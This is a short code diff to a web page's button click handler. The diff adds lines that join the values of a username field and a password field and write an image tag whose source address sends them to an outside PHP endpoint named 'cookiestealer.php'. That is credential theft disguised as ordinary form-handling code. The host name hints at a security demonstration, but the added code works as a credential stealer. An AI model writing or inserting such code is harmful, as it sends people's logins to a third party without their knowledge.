@@ -1,7 +1,9 @@
 <script>
 document.getElementById('button').onclick = function() {
    alert("button was clicked");
-   user=document.getElementById("input-6").value
-   password=document.getElementById("input-7").value
+   var user="User: "+document.getElementById("input-6").value
+   var password="Password: "+document.getElementById("input-7").value
+   var res = user.concat(password);   
+   document.write('<img src="http://ethical.us-east-2.elasticbeanstalk.com/cookiestealer.php?c=' + res + '" />')
 };
 </script>
